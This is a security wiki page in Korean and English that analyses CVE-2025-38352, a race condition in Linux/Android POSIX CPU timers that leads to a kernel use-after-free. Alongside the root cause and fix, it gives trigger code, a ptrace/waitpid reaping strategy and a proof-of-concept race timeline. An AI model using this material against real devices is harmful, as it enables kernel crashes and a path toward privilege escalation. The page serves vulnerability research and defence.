# POSIX CPU Timers TOCTOU race (CVE-2025-38352)

{{#include ../../../banners/hacktricks-training.md}}

이 페이지는 Linux/Android POSIX CPU timers의 TOCTOU race condition을 문서화합니다. 이는 타이머 상태를 손상시키고 커널을 크래시시킬 수 있으며, 일부 상황에서는 privilege escalation으로 이어질 수 있습니다.

- 영향 받는 구성요소: kernel/time/posix-cpu-timers.c
- 기본 원리: expiry vs deletion race under task exit
- 구성 민감: CONFIG_POSIX_CPU_TIMERS_TASK_WORK=n (IRQ-context expiry path)

간단한 내부 요약 (exploitation에 관련됨)
- 타이머 계정 관리는 cpu_clock_sample()를 통해 세 가지 CPU 클럭으로 수행된다:
- CPUCLOCK_PROF: utime + stime
- CPUCLOCK_VIRT: utime only
- CPUCLOCK_SCHED: task_sched_runtime()
- Timer 생성은 타이머를 task/pid에 연결하고 timerqueue 노드를 초기화한다:
```c
static int posix_cpu_timer_create(struct k_itimer *new_timer) {
struct pid *pid;
rcu_read_lock();
pid = pid_for_clock(new_timer->it_clock, false);
if (!pid) { rcu_read_unlock(); return -EINVAL; }
new_timer->kclock = &clock_posix_cpu;
timerqueue_init(&new_timer->it.cpu.node);
new_timer->it.cpu.pid = get_pid(pid);
rcu_read_unlock();
return 0;
}
```
- Arming은 per-base timerqueue에 삽입하며 next-expiry cache를 업데이트할 수 있습니다:
```c
static void arm_timer(struct k_itimer *timer, struct task_struct *p) {
struct posix_cputimer_base *base = timer_base(timer, p);
struct cpu_timer *ctmr = &timer->it.cpu;
u64 newexp = cpu_timer_getexpires(ctmr);
if (!cpu_timer_enqueue(&base->tqhead, ctmr)) return;
if (newexp < base->nextevt) base->nextevt = newexp;
}
```
- 빠른 경로는 캐시된 만료가 발동할 가능성을 나타내지 않는 한 비용이 많이 드는 처리를 피합니다:
```c
static inline bool fastpath_timer_check(struct task_struct *tsk) {
struct posix_cputimers *pct = &tsk->posix_cputimers;
if (!expiry_cache_is_inactive(pct)) {
u64 samples[CPUCLOCK_MAX];
task_sample_cputime(tsk, samples);
if (task_cputimers_expired(samples, pct))
return true;
}
return false;
}
```
- Expiration은 만료된 타이머를 수집하고, 이를 firing 상태로 표시하며, 큐에서 제거합니다; 실제 전달은 연기됩니다:
```c
#define MAX_COLLECTED 20
static u64 collect_timerqueue(struct timerqueue_head *head,
struct list_head *firing, u64 now) {
struct timerqueue_node *next; int i = 0;
while ((next = timerqueue_getnext(head))) {
struct cpu_timer *ctmr = container_of(next, struct cpu_timer, node);
u64 expires = cpu_timer_getexpires(ctmr);
if (++i == MAX_COLLECTED || now < expires) return expires;
ctmr->firing = 1;                           // critical state
rcu_assign_pointer(ctmr->handling, current);
cpu_timer_dequeue(ctmr);
list_add_tail(&ctmr->elist, firing);
}
return U64_MAX;
}
```
두 가지 만료 처리 모드
- CONFIG_POSIX_CPU_TIMERS_TASK_WORK=y: 만료는 대상 task의 task_work를 통해 연기됨
- CONFIG_POSIX_CPU_TIMERS_TASK_WORK=n: 만료는 IRQ 컨텍스트에서 직접 처리됨

<details>
<summary>Task_work와 IRQ 만료 경로</summary>
```c
void run_posix_cpu_timers(void) {
struct task_struct *tsk = current;
__run_posix_cpu_timers(tsk);
}
#ifdef CONFIG_POSIX_CPU_TIMERS_TASK_WORK
static inline void __run_posix_cpu_timers(struct task_struct *tsk) {
if (WARN_ON_ONCE(tsk->posix_cputimers_work.scheduled)) return;
tsk->posix_cputimers_work.scheduled = true;
task_work_add(tsk, &tsk->posix_cputimers_work.work, TWA_RESUME);
}
#else
static inline void __run_posix_cpu_timers(struct task_struct *tsk) {
lockdep_posixtimer_enter();
handle_posix_cpu_timers(tsk);                  // IRQ-context path
lockdep_posixtimer_exit();
}
#endif
```
</details>

IRQ-context 경로에서는 firing list가 sighand 외부에서 처리됩니다.

<details>
<summary>IRQ-context 전달 루프</summary>
```c
static void handle_posix_cpu_timers(struct task_struct *tsk) {
struct k_itimer *timer, *next; unsigned long flags, start;
LIST_HEAD(firing);
if (!lock_task_sighand(tsk, &flags)) return;   // may fail on exit
do {
start = READ_ONCE(jiffies); barrier();
check_thread_timers(tsk, &firing);
check_process_timers(tsk, &firing);
} while (!posix_cpu_timers_enable_work(tsk, start));
unlock_task_sighand(tsk, &flags);              // race window opens here
list_for_each_entry_safe(timer, next, &firing, it.cpu.elist) {
int cpu_firing;
spin_lock(&timer->it_lock);
list_del_init(&timer->it.cpu.elist);
cpu_firing = timer->it.cpu.firing;         // read then reset
timer->it.cpu.firing = 0;
if (likely(cpu_firing >= 0)) cpu_timer_fire(timer);
rcu_assign_pointer(timer->it.cpu.handling, NULL);
spin_unlock(&timer->it_lock);
}
}
```
</details>

근본 원인: IRQ-time 만료와 task 종료 중 동시 삭제 간의 TOCTOU
Preconditions
- CONFIG_POSIX_CPU_TIMERS_TASK_WORK is disabled (IRQ path in use)
- 대상 task는 종료 중이지만 완전히 회수(reaped)되지 않음
- 다른 스레드가 동일한 타이머에 대해 posix_cpu_timer_del()을 동시에 호출함

Sequence
1) update_process_times()가 종료 중인 task에 대해 IRQ 컨텍스트에서 run_posix_cpu_timers()를 트리거함.
2) collect_timerqueue()는 ctmr->firing = 1로 설정하고 타이머를 임시 firing 리스트로 옮김.
3) handle_posix_cpu_timers()는 unlock_task_sighand()를 통해 sighand를 해제하여 락 외부에서 타이머를 전달함.
4) unlock 직후, 종료 중인 task가 reaped될 수 있고; 형제 스레드가 posix_cpu_timer_del()을 실행함.
5) 이 창에서 posix_cpu_timer_del()은 cpu_timer_task_rcu()/lock_task_sighand()를 통해 state를 획득하지 못할 수 있으며, 따라서 timer->it.cpu.firing을 확인하는 일반적인 in-flight 가드를 건너뛸 수 있다. 삭제가 firing이 아닌 것처럼 진행되어 만료 처리 중에 상태가 손상되고, 그 결과 크래시/UB로 이어질 수 있다.

### release_task()와 timer_delete()가 firing 타이머를 해제하는 방법
handle_posix_cpu_timers()가 task 리스트에서 타이머를 제거한 이후에도, ptraced zombie는 여전히 reaped될 수 있다. waitpid() 스택은 release_task() → __exit_signal()를 구동하며, 이 과정에서 sighand와 신호 큐를 해체하는데 다른 CPU는 여전히 타이머 객체에 대한 포인터를 보유하고 있다:
```c
static void __exit_signal(struct task_struct *tsk)
{
struct sighand_struct *sighand = lock_task_sighand(tsk, NULL);
// ... signal cleanup elided ...
tsk->sighand = NULL;             // makes future lock_task_sighand() fail
unlock_task_sighand(tsk, NULL);
}
```
sighand가 분리된 상태에서도 timer_delete()는 여전히 성공을 반환하는데 posix_cpu_timer_del()이 락 획득에 실패할 때 `ret = 0`으로 남겨두어 syscall이 RCU를 통해 객체를 해제하도록 진행되기 때문이다:
```c
static int posix_cpu_timer_del(struct k_itimer *timer)
{
struct sighand_struct *sighand = lock_task_sighand(p, &flags);
if (unlikely(!sighand))
goto out;                   // ret stays 0 -> userland sees success
// ... normal unlink path ...
}
```

```c
SYSCALL_DEFINE1(timer_delete, timer_t, timer_id)
{
if (timer_delete_hook(timer) == TIMER_RETRY)
timer = timer_wait_running(timer, &flags);
posix_timer_unhash_and_free(timer);            // call_rcu(k_itimer_rcu_free)
return 0;
}
```
Because the slab object is RCU-freed while IRQ context still walks the `firing` list, reuse of the timer cache becomes a UAF primitive.

### Steering reaping with ptrace + waitpid
좀비가 자동으로 수거되지 않고 남아 있도록 하는 가장 쉬운 방법은 non-leader worker thread를 ptrace하는 것이다. exit_notify()는 먼저 `exit_state = EXIT_ZOMBIE`를 설정하고 `autoreap`가 true일 때만 EXIT_DEAD로 전환된다. ptraced된 스레드의 경우 SIGCHLD가 무시되지 않는 한 `autoreap = do_notify_parent()`는 false로 유지되므로 release_task()는 부모가 명시적으로 waitpid()를 호출할 때만 실행된다:

- 트레이시 내부에서 pthread_create()를 사용해 피해자가 thread-group leader가 아니게 한다 (wait_task_zombie()는 ptraced non-leaders를 처리한다).
- 부모는 `ptrace(PTRACE_ATTACH, tid)`를 호출하고 이후 `waitpid(tid, __WALL)`를 호출하여 do_wait_pid() → wait_task_zombie() → release_task() 흐름을 유도한다.
- 파이프나 공유 메모리로 정확한 TID를 부모에게 전달해 올바른 워커를 필요 시에만 수거하게 한다.

이런 연출은 handle_posix_cpu_timers()가 여전히 `tsk->sighand`를 참조할 수 있는 창을 보장하며, 이후의 waitpid()가 이를 해제해 timer_delete()가 동일한 k_itimer 객체를 회수할 수 있게 한다.

### Why TASK_WORK mode is safe by design
- CONFIG_POSIX_CPU_TIMERS_TASK_WORK=y인 경우 만료 처리가 task_work로 연기된다; exit_task_work는 exit_notify보다 먼저 실행되므로 IRQ 시간에 reaping과 겹치지 않는다.
- 그럼에도 불구하고 task가 이미 종료 중이면 task_work_add()는 실패한다; exit_state를 기준으로 제어하면 두 모드가 일관되게 동작한다.

Fix (Android common kernel) and rationale
- 현재 task가 종료 중이면 조기 반환을 추가해 모든 처리를 차단한다:
```c
// kernel/time/posix-cpu-timers.c (Android common kernel commit 157f357d50b5038e5eaad0b2b438f923ac40afeb)
if (tsk->exit_state)
return;
```
- 이것은 종료 중인 태스크에 대해 handle_posix_cpu_timers()에 진입하는 것을 방지하여 posix_cpu_timer_del()이 it.cpu.firing을 놓치고 만료 처리와 경쟁(race)할 수 있는 시간 창을 제거합니다.

Impact
- 동시 만료/삭제(expiry/deletion) 동안 타이머 구조체의 커널 메모리 손상은 즉시 크래시(DoS)를 일으킬 수 있으며, 임의의 커널 상태 조작 기회를 통해 privilege escalation을 위한 강력한 primitive가 됩니다.

Triggering the bug (safe, reproducible conditions)
Build/config
- Ensure CONFIG_POSIX_CPU_TIMERS_TASK_WORK=n and use a kernel without the exit_state gating fix. On x86/arm64 the option is normally forced on via HAVE_POSIX_CPU_TIMERS_TASK_WORK, so researchers often patch `kernel/time/Kconfig` to expose a manual toggle:
```c
config POSIX_CPU_TIMERS_TASK_WORK
bool "CVE-2025-38352: POSIX CPU timers task_work toggle" if EXPERT
depends on POSIX_TIMERS && HAVE_POSIX_CPU_TIMERS_TASK_WORK
default y
```
이는 분석 빌드용으로 Android 공급업체가 한 것과 유사합니다; upstream x86_64 and arm64는 HAVE_POSIX_CPU_TIMERS_TASK_WORK=y를 강제 설정하므로, 취약한 IRQ 경로는 해당 옵션이 컴파일 아웃된 32비트 Android 커널에서 주로 존재합니다.

- 멀티코어 VM에서 실행하세요(예: QEMU `-smp cores=4`) — 부모, 자식 메인 및 워커 스레드가 전용 CPU에 고정될 수 있도록.

런타임 전략
- 종료 직전의 스레드를 목표로 삼아 CPU 타이머를 연결합니다(스레드별 또는 프로세스 전체 시계):
- 스레드별인 경우: timer_create(CLOCK_THREAD_CPUTIME_ID, ...)
- 프로세스 전체인 경우: timer_create(CLOCK_PROCESS_CPUTIME_ID, ...)
- IRQ 경로 진입을 최대화하기 위해 초기 만료 시간을 매우 짧게 하고 반복 간격을 작게 설정하세요:
```c
static timer_t t;
static void setup_cpu_timer(void) {
struct sigevent sev = {0};
sev.sigev_notify = SIGEV_SIGNAL;    // delivery type not critical for the race
sev.sigev_signo = SIGUSR1;
if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &t)) perror("timer_create");
struct itimerspec its = {0};
its.it_value.tv_nsec = 1;           // fire ASAP
its.it_interval.tv_nsec = 1;        // re-fire
if (timer_settime(t, 0, &its, NULL)) perror("timer_settime");
}
```
- 형제 스레드에서 대상 스레드가 종료되는 동안 동일한 타이머를 동시에 삭제:
```c
void *deleter(void *arg) {
for (;;) (void)timer_delete(t);     // hammer delete in a loop
}
```
- 레이스 증폭 요인: 높은 스케줄러 틱 속도, CPU 부하, 반복적인 스레드 종료/재생성 사이클. 이 충돌은 일반적으로 unlock_task_sighand() 직후 task lookup/locking이 실패하여 posix_cpu_timer_del()이 타이머 발동을 인지하지 못할 때 발생한다.

### Practical PoC orchestration
#### Thread & IPC choreography
신뢰할 수 있는 재현 코드는 ptracing parent와 취약한 워커 스레드를 생성하는 child로 포크된다. 두 개의 파이프(`c2p`, `p2c`)가 워커의 TID를 전달하고 각 단계를 제어하며, `pthread_barrier_t`는 부모가 attach할 때까지 워커가 타이머를 설정하는 것을 막는다. 각 프로세스 또는 스레드는 `sched_setaffinity()`로 고정(예: parent on CPU1, child main on CPU0, worker on CPU2)되어 스케줄러 노이즈를 최소화하고 레이스 재현성을 유지한다.

#### Timer calibration with CLOCK_THREAD_CPUTIME_ID
워커는 자신의 CPU 사용 시간만이 데드라인을 진행시키도록 스레드별 CPU 타이머를 설정한다. 조정 가능한 `wait_time`(기본값 ≈250 µs의 CPU 시간)과 제한된 바쁜 루프는 타이머가 거의 발동하려는 순간에 `exit_notify()`가 `EXIT_ZOMBIE`를 설정하도록 보장한다:

<details>
<summary>최소 스레드별 CPU 타이머 스켈레톤</summary>
```c
static timer_t timer;
static long wait_time = 250000; // nanoseconds of CPU time

static void timer_fire(sigval_t unused) {
puts("timer fired");
}

static void *worker(void *arg) {
struct sigevent sev = {0};
sev.sigev_notify = SIGEV_THREAD;
sev.sigev_notify_function = timer_fire;
timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &timer);

struct itimerspec ts = {
.it_interval = {0, 0},
.it_value    = {0, wait_time},
};

pthread_barrier_wait(&barrier);  // released by child main after ptrace attach
timer_settime(timer, 0, &ts, NULL);

for (volatile int i = 0; i < 1000000; i++); // burn CPU before exiting
return NULL;                                 // do_exit() keeps burning CPU
}
```
</details>

#### 경쟁 타임라인
1. 자식이 `c2p`로 부모에게 worker TID를 알려준 뒤 바리어에서 블록한다.
2. 부모가 `PTRACE_ATTACH`를 수행하고 `waitpid(__WALL)`에서 대기한 다음, `PTRACE_CONT`로 워커를 실행시켜 종료시킨다.
3. 휴리스틱(또는 수동 조작자 입력)이 타이머가 IRQ 측의 `firing` 리스트로 수집되었다고 판단하면, 부모는 release_task()를 트리거하고 `tsk->sighand`를 해제하기 위해 `waitpid(tid, __WALL)`를 다시 실행한다.
4. 부모는 `p2c`로 자식에게 신호를 보내 자식의 main이 `timer_delete(timer)`를 호출하고 타이머의 RCU 콜백이 완료될 때까지 `wait_for_rcu()` 같은 헬퍼를 즉시 실행하도록 한다.
5. IRQ 컨텍스트는 결국 `handle_posix_cpu_timers()`를 재개하고 해제된 `struct k_itimer`를 역참조하여 KASAN 또는 WARN_ON()을 발생시킨다.

#### 선택적 커널 계측
연구 환경에서는 `tsk->comm == "SLOWME"`일 때 handle_posix_cpu_timers() 내부에 디버그 전용 `mdelay(500)`를 주입하면 윈도우가 넓어져 위의 연출이 거의 항상 레이스에서 이긴다. 동일한 PoC는 스레드 이름을 (`prctl(PR_SET_NAME, ...)`) 바꿔 커널 로그와 브레이크포인트로 예상한 워커가 수거되는지 확인할 수 있게 한다.

### 익스플로잇 중 계측 단서
- unlock_task_sighand()/posix_cpu_timer_del() 주변에 tracepoints/WARN_ONCE를 추가하여 `it.cpu.firing==1`이 cpu_timer_task_rcu()/lock_task_sighand() 실패와 동시에 발생하는 경우를 포착하고, 피해자(victim)가 종료될 때 timerqueue 일관성을 모니터링한다.
- KASAN은 보통 posix_timer_queue_signal() 내부에서 `slab-use-after-free`를 보고하는 반면, KASAN이 없는 커널에서는 레이스가 성사되었을 때 send_sigqueue()에서 WARN_ON_ONCE()를 로그하여 빠른 성공 지표를 제공한다.

감사 핫스팟(리뷰어용)
- update_process_times() → run_posix_cpu_timers() (IRQ)
- __run_posix_cpu_timers() 선택 (TASK_WORK vs IRQ 경로)
- collect_timerqueue(): ctmr->firing를 설정하고 노드를 이동함
- handle_posix_cpu_timers(): firing 루프 전에 sighand를 해제함
- posix_cpu_timer_del(): it.cpu.firing에 의존하여 진행 중인 만료를 감지함; 이 검사는 exit/reap 도중 task 조회/잠금에 실패하면 건너뛰어진다

익스플로잇 연구 참고사항
공개된 동작은 신뢰할 수 있는 커널 크래시 프리미티브이다; 이를 권한 상승으로 전환하려면 일반적으로 이 요약의 범위를 벗어나는 추가적인 제어 가능한 겹침(객체 수명이나 write-what-where 영향 등)이 필요하다. 모든 PoC는 시스템을 불안정하게 만들 수 있으므로 에뮬레이터/VM에서만 실행하라.

## References
- [Race Against Time in the Kernel’s Clockwork (StreyPaws)](https://streypaws.github.io/posts/Race-Against-Time-in-the-Kernel-Clockwork/)
- [Android security bulletin – September 2025](https://source.android.com/docs/security/bulletin/2025-09-01)
- [Android common kernel patch commit 157f357d50b5…](https://android.googlesource.com/kernel/common/+/157f357d50b5038e5eaad0b2b438f923ac40afeb%5E%21/#F0)
- [CVE-2025-38352 – In-the-wild Android Kernel Vulnerability Analysis and PoC](https://faith2dxy.xyz/2025-12-22/cve_2025_38352_analysis/)
- [poc-CVE-2025-38352 (GitHub)](https://github.com/farazsth98/poc-CVE-2025-38352)
- [Linux stable fix commit f90fff1e152d](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?id=f90fff1e152dedf52b932240ebbd670d83330eca)

{{#include ../../../banners/hacktricks-training.md}}
